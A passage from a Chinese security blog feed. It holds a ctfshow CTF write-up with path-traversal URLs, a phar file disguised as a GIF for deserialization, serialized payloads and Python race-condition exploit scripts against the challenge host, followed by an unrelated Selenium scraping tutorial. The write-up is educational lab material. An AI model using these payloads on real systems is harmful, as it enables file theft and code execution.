<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = unserialize(file_get_contents(<span class="variable">$file_path</span>));</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$page_file</span>        = <span class="variable">$data</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_path</span>        = <span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_state</span>       = <span class="variable">$data</span>[<span class="string">&#x27;state&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_title</span>       = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_content</span>     = <span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_date</span>        = <span class="variable">$data</span>[<span class="string">&#x27;date&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_time</span>        = <span class="variable">$data</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line">  <span class="variable">$page_can_comment</span> = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;can_comment&#x27;</span>]) ? <span class="variable">$data</span>[<span class="string">&#x27;can_comment&#x27;</span>] : <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>显而易见，去掉了反序列化函数，并且直接打印结果造成任意文件读取</p>
<p>开始构造的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mc-admin/page-edit.php?file=../../../../../../flag</span><br></pre></td></tr></table></figure>

<p>but</p>
<p><img src="https://ech0zr.github.io/img/post/ctfshow_daji/image-20210124121633140.png" alt="image-20210124121633140"></p>
<p>利用目录存在和不存在时候的回显不同找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mc-admin/page-edit.php?file=../../../../../../var/www/html/ctfshowsecretfilehh/</span><br></pre></td></tr></table></figure>

<p>直接访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshowsecretfilehh/</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;cp /hint* /var/www/html/hint.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">readgzfile(waf(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接读取waf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mc-admin/page-edit.php?file=../../../../../../var/www/html/ctfshowsecretfilehh/waf.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;姿势太简单啦，来一点骚的？！&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一看没有发序列化函数但是又需要触发类的操作，并且waf过滤很多phar为协议的操作，很明显就是通过phar进行反序列化</p>
<p>后台很明显有上传点</p>
<p>尝试读取upload.php（出题人自己加的文件，源码泄露的压缩包里没有）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mc-admin/page-edit.php?file=../../../../../../var/www/html/upload.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo $_FILES[&quot;file&quot;][&quot;size&quot;];</span></span><br><span class="line"><span class="variable">$extension</span> = end(<span class="variable">$temp</span>);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048000</span>)   <span class="comment">// 小于 2000kb</span></span><br><span class="line">&amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件出错: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$md5_unix_random</span> =substr(md5(time()),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line">			<span class="variable">$filename</span> = <span class="variable">$md5_unix_random</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传成功,文件存在upload/&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;文件类型仅支持jpg、png、gif等图片格式&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>原来上传的文件名被加密了，可以直接猜解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// Sun, 24 Jan 2021 06:42:28 GMT</span></span><br><span class="line"><span class="variable">$t</span> = strtotime(date(<span class="string">&quot;2021-01-24 14:42:28&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="variable">$t</span>),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>做一个phar</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;g.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改后缀为gif上传就行</p>
<p>因为waf把phar的组合拳过滤的差不多，因为readgzfile函数的存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshowsecretfilehh/?file=zlib:phar:///var/www/html/upload/7e0fdf16.gif/test.txt</span><br></pre></td></tr></table></figure>

<p>然后读取hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mc-admin/page-edit.php?file=../../../../../../var/www/html/hint.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/ctfshow_daji/image-20210125133330491.png" alt="image-20210125133330491"></p>
<p>获得了新地址</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$unser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;unser&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;Firebasky&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username==<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password==(<span class="keyword">int</span>)md5(time()))&#123;</span><br><span class="line">            system(<span class="string">&#x27;cp /ctfshow* /var/www/html/flag.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span>=@unserialize(<span class="variable">$unser</span>);</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>条件竞争</p>
<p>先构造一个反序列化的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Unser();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$t</span>); </span><br><span class="line"><span class="comment">// O:5:&quot;Unser&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;ctfshow&quot;;s:8:&quot;password&quot;;s:32:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s,salt=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    new_s = <span class="built_in">str</span>(s) + salt</span><br><span class="line">    m = hashlib.md5(new_s.encode())</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    time_now = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    m = md5(time_now)</span><br><span class="line">    url = <span class="string">&#x27;http://3bdb557c-3d95-46bc-a73c-3240ae389a70.chall.ctf.show/ctfshowgetflaghhhh/&#x27;</span> + <span class="string">&#x27;?unser=O:5:&quot;Unser&quot;:2:&#123;&#123;s:8:&quot;username&quot;;s:7:&quot;ctfshow&quot;;s:8:&quot;password&quot;;s:32:&#123;&#125;;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(m)</span><br><span class="line">    r = requests.get(url)</span><br></pre></td></tr></table></figure>

<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = <span class="string">&quot;http://3bdb557c-3d95-46bc-a73c-3240ae389a70.chall.ctf.show/mc-admin/page-edit.php?file=../../../../../../var/www/html/flag.txt&quot;</span></span><br><span class="line">    cookie = &#123;<span class="string">&#x27;mc_token&#x27;</span>:<span class="string">&#x27;c30807e6587ade285ba7ade9f881b3d7&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="虎山行’s-revenge"><a href="#虎山行’s-revenge" class="headerlink" title="虎山行’s revenge"></a>虎山行’s revenge</h2><p>跟上题一样</p>
<h2 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>源码有明显的base64，解码一行发现jpeg的请求头</p>
<p>写个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bb= <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        s  = i.strip().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        b = base64.b64decode(s)</span><br><span class="line">        bb += b</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">    ff.write(bb)</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/ctfshow_daji/b.jpg" alt="b"></p>
<p>啊这。。。</p>
<p>将参数改为<code>?file=flag</code></p>
<p>获得另一张图片</p>
<p><img src="https://ech0zr.github.io/img/post/ctfshow_daji/f.jpg" alt="f"></p>
<p>一个微信小程序</p>
<p>一个小游戏，小程序反编译我可太会了，之前博客总结过</p>
<p><a href="https://z3p5.github.io/z3p5/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91.html">小程序反编译</a></p>
<p>然后在源码里就找到了flag</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strings ./youshouok/* grep flag&#123;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctfshow大吉大利杯</tag>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Selenium基础总结</title>
    <url>/2020/03/03/Selenium%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium 是一个 web 的自动化测试工具 ，我这里主要用它进行爬虫，因为传统的requests只能爬去静态网页的内容，而很多内容需要进入网页加载后才能显示，例如处理弹窗等等。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装库：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure>

<p>安装 webdriver ：</p>
<p> webdriver 相当于一个浏览器的内核。各大浏览器都可以下载。</p>
<p> Chrome 的下载地址：</p>
<p> <a href="https://sites.google.com/a/chromium.org/chromedriver/">https://sites.google.com/a/chromium.org/chromedriver/</a> </p>
<p>or</p>
<p> <a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a> </p>
<p>注意 webdriver需要和对应的浏览器版本以及selenium版本对应 </p>
<table>
<thead>
<tr>
<th>Webdriver版本</th>
<th><strong>支持的Chrome版本</strong></th>
</tr>
</thead>
<tbody><tr>
<td>v2.41</td>
<td>v67-69</td>
</tr>
<tr>
<td>v2.40</td>
<td>v66-68</td>
</tr>
<tr>
<td>v2.39</td>
<td>v66-68</td>
</tr>
<tr>
<td>v2.38</td>
<td>v65-67</td>
</tr>
<tr>
<td>v2.37</td>
<td>v64-66</td>
</tr>
<tr>
<td>v2.36</td>
<td>v63-65</td>
</tr>
<tr>
<td>v2.35</td>
<td>v62-64</td>
</tr>
<tr>
<td>v2.34</td>
<td>v61-63</td>
</tr>
<tr>
<td>v2.33</td>
<td>v60-62</td>
</tr>
</tbody></table>
<p>然后讲下载的 webdriver 放在python的根目录即可。</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><h4 id="普通启动"><a href="#普通启动" class="headerlink" title="普通启动"></a>普通启动</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Headless启动"><a href="#Headless启动" class="headerlink" title="Headless启动"></a>Headless启动</h4><p>即无形启动，官方文档中介绍，mac和linux环境要求chrome版本是59+，而windows版本的chrome要求是60+，同时chromedriver要求2.30+版本。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line"><span class="comment"># 使用headless无界面浏览器模式</span></span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>) //增加无界面选项</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>) //如果不加这个选项，有时定位会出现问题</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，获取网页源代码</span></span><br><span class="line">browser = webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line">mainUrl = <span class="string">&quot;https://www.taobao.com/&quot;</span></span><br><span class="line">browser.get(mainUrl)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;browser text = <span class="subst">&#123;browser.page_source&#125;</span>&quot;</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>

<h3 id="元素定位"><a href="#元素定位" class="headerlink" title="元素定位"></a>元素定位</h3><ul>
<li><p>id定位：find_element_by_id()</p>
</li>
<li><p>name定位：find_element_by_name()</p>
</li>
<li><p>class定位：find_element_by_class_name()</p>
</li>
<li><p>link定位：find_element_by_link_text()</p>
</li>
<li><p>partial link定位：find_element_by_partial_link_text()</p>
</li>
<li><p>tag定位：find_element_by_tag_name()</p>
</li>
<li><p>xpath定位：find_element_by_xpath()</p>
</li>
<li><p>css定位：find_element_by_css_selector()</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser=webdriver.Firefox()</span><br><span class="line">browser.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">#########百度输入框的定位方式##########</span></span><br><span class="line"><span class="comment">#通过id方式定位</span></span><br><span class="line">browser.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过name方式定位</span></span><br><span class="line">browser.find_element_by_name(<span class="string">&quot;wd&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过tag name方式定位</span></span><br><span class="line">browser.find_element_by_tag_name(<span class="string">&quot;input&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过partial link定位</span></span><br><span class="line">browser.find_element_by_partial_link_text(<span class="string">&quot;教务&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过class name方式定位</span></span><br><span class="line">browser.find_element_by_class_name(<span class="string">&quot;s_ipt&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过CSS方式定位</span></span><br><span class="line">browser.find_element_by_css_selector(<span class="string">&quot;#kw&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">#通过xpath方式定位</span></span><br><span class="line">browser.find_element_by_xpath(<span class="string">&quot;//input[@id=&#x27;kw&#x27;]&quot;</span>).send_keys(<span class="string">&quot;selenium&quot;</span>)</span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line">browser.find_element_by_id(<span class="string">&quot;su&quot;</span>).click()</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>

<h4 id="xpath定位"><a href="#xpath定位" class="headerlink" title="xpath定位"></a>xpath定位</h4><p> XPath 是一门在 XML 文档中查找信息的语言。 </p>
<p>个人认为xpath定位方法比较全能。</p>
<ul>
<li>选取节点</li>
</ul>
<table>
<thead>
<tr>
<th><strong>表达式</strong></th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>nodename</td>
<td>选取此节点的所有子节点。</td>
</tr>
<tr>
<td>/</td>
<td>从根节点选取。</td>
</tr>
<tr>
<td>//</td>
<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点。</td>
</tr>
<tr>
<td>..</td>
<td>选取当前节点的父节点。</td>
</tr>
<tr>
<td>@</td>
<td>选取属性。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>路径表达式</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>bookstore</td>
<td>选取 bookstore 元素的所有子节点。</td>
</tr>
<tr>
<td>/bookstore</td>
<td>选取根元素 bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！</td>
</tr>
<tr>
<td>bookstore/book</td>
<td>选取属于 bookstore 的子元素的所有 book 元素。</td>
</tr>
<tr>
<td>//book</td>
<td>选取所有 book 子元素，而不管它们在文档中的位置。</td>
</tr>
<tr>
<td>bookstore//book</td>
<td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td>
</tr>
<tr>
<td>//@lang</td>
<td>选取名为 lang 的所有属性。</td>
</tr>
</tbody></table>
<p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p>
<p>谓语被嵌在方括号中。</p>
<table>
<thead>
<tr>
<th><strong>路径表达式</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/book[1]</td>
<td>选取属于 bookstore 子元素的第一个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[last()]</td>
<td>选取属于 bookstore 子元素的最后一个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[last()-1]</td>
<td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[position()&lt;3]</td>
<td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td>
</tr>
<tr>
<td>//title[@lang]</td>
<td>选取所有拥有名为 lang 的属性的 title 元素。</td>
</tr>
<tr>
<td>//title[@lang=’eng’]</td>
<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]</td>
<td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]/title</td>
<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td>
</tr>
</tbody></table>
<ul>
<li>选取未知节点</li>
</ul>
<p> XPath 通配符可用来选取未知的 XML 元素。 </p>
<table>
<thead>
<tr>
<th><strong>通配符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配任何元素节点。</td>
</tr>
<tr>
<td>@*</td>
<td>匹配任何属性节点。</td>
</tr>
<tr>
<td>node()</td>
<td>匹配任何类型的节点。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><strong>路径表达式</strong></th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/*</td>
<td>选取 bookstore 元素的所有子元素。</td>
</tr>
<tr>
<td>//*</td>
<td>选取文档中的所有元素。</td>
</tr>
<tr>
<td>//title[@*]</td>
<td>选取所有带有属性的 title 元素。</td>
</tr>
</tbody></table>
<ul>
<li>选取若干路径</li>
</ul>
<table>
<thead>
<tr>
<th><strong>路径表达式</strong></th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>//book/title | //book/price</td>
<td>选取 book 元素的所有 title 和 price 元素。</td>
</tr>
<tr>
<td>//title | //price</td>
<td>选取文档中的所有 title 和 price 元素。</td>
</tr>
<tr>
<td>/bookstore/book/title | //price</td>
<td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td>
</tr>
</tbody></table>
<h4 id="当class含有空格"><a href="#当class含有空格" class="headerlink" title="当class含有空格"></a>当class含有空格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#前面加（.）空格地方用点（.）来代替</span></span><br><span class="line">self.driver.find_element_by_css_selector(<span class="string">&#x27;.dtb-style-1.table-dragColumns&#x27;</span>).click()</span><br></pre></td></tr></table></figure>

<h3 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h3><h4 id="强制等待"><a href="#强制等待" class="headerlink" title="强制等待"></a>强制等待</h4><p>sleep()</p>
<h4 id="隐性等待"><a href="#隐性等待" class="headerlink" title="隐性等待"></a>隐性等待</h4><p>在一个时间范围内智能等待</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.implicitly_wait(<span class="number">30</span>)  <span class="comment"># 隐性等待，最长等30秒</span></span><br><span class="line">driver.get(<span class="string">&#x27;http://baidu.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>

<h4 id="显性等待"><a href="#显性等待" class="headerlink" title="显性等待"></a>显性等待</h4><p>就是每隔几秒看看加载完没有</p>
<p>方法略</p>
